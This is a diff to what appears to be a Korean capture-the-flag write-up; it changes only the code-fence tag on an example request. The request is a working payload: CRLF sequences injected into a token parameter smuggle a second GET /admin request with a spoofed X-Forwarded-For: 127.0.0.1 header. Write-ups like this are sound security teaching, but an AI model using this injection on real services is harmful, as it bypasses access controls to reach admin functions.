@@ -97,7 +97,7 @@ async def get_admin(request: Request):
 하지만 `delete` 는 response를 `json.loads(res)` 를 거치지 않고 그대로 출력하여 `delete`를 통해 요청을 보낸다.
 또한 해당 요청도 마찬가지로 `token` 값이 필요하여 추가하면 아래와 같은 요청이 완성된다.
 
-```http
+```html
 POST /delete?simple_token=b32ebc7d96a42f3a065534fd1943619f2ed7158466230d844e9575b67bb4c98e%0d%0a%0d%0aGET%20/admin%20HTTP/1.1%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aSimple-Token:%20b32ebc7d96a42f3a065534fd1943619f2ed7158466230d844e9575b67bb4c98e
 ```
 
